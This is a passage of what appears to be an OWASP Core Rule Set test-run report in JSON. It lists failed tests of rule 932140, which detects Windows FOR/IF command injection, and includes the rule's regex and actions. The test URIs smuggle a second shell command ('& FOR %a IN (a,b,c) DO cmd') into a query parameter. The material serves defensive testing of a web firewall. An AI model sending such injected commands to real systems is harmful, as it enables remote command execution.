          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 19,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 19,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+for+%25a+in+%28a%2Cb%2Cc%29+do+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 20,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%25a+IN+%28a%2Cb%2Cc%29+DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 21,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 21,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25_+IN+%28a%2Cb%2Cc%29+DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 22,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 22,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%252+IN+%28a%2Cb%2Cc%29+DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 23,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25-+IN+%28a%2Cb%2Cc%29+DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
